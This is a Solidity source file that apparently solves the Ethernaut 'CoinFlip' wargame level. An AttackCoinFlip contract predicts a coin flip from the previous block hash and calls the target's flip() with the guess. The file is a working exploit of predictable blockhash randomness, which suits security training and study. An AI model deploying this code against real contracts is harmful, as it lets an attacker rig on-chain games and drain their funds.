// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  function flip(bool _guess) public returns (bool) {}

}

contract AttackCoinFlip {

    CoinFlip c;
 
    constructor (address _CoinFlip) {
        c = CoinFlip(_CoinFlip);
    }

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
   
    function getGuess() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
				return side;
    }

        function attack() public {
        c.flip(getGuess());
    }
}